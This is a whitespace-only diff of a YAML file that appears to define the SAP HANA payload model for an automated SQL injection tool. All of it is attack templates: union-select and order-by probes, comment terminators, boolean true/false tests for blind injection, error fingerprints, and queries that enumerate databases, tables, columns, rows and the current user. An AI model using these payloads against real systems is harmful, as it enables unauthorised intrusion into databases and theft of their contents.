@@ -1,6 +1,6 @@
 vendor: Hana
 
-resource: 
+resource:
  info: |
   select
       '${enclose_value_sql}'
@@ -11,10 +11,10 @@ resource:
       || CURRENT_USER
       || '${trail_sql}'
   from sys.m_database
-  
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        STRING_AGG(
            '${enclose_value_sql}'
            || r
@@ -31,9 +31,9 @@ resource:
        order by r
        ${limit}
    )
-   
+
   table: |
-   select 
+   select
        STRING_AGG(
            '${enclose_value_sql}'
            || r
@@ -55,9 +55,9 @@ resource:
        order by r
        ${limit}
    )
-   
+
   column: |
-   select 
+   select
        STRING_AGG(
            '${enclose_value_sql}'
            || r
@@ -81,10 +81,10 @@ resource:
        order by r
        ${limit}
    )
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         STRING_AGG(
             '${enclose_value_sql}'
             || r
@@ -101,12 +101,12 @@ resource:
         order by r
         ${limit}
     )
-   fields: 
+   fields:
     field: trim(coalesce(${field.value}, ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    select
        /**
@@ -126,31 +126,31 @@ strategy:
   failsafe: (1337${indice}7330%2b1)
   calibrator: |
    rpad(
-       '${calibrator_sql}', 
-       1024, 
+       '${calibrator_sql}',
+       1024,
        '${calibrator_sql}'
    )
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - Hana database
-    
- normal: 
+
+ normal:
   indices: union select ${indices} from dummy
   capacity: ('${lead}'|| ${indice}|| ${calibrator})
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - true = false
     - true %21= true
     - false %21= false
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - true = true
     - false = false
     - true %21= false
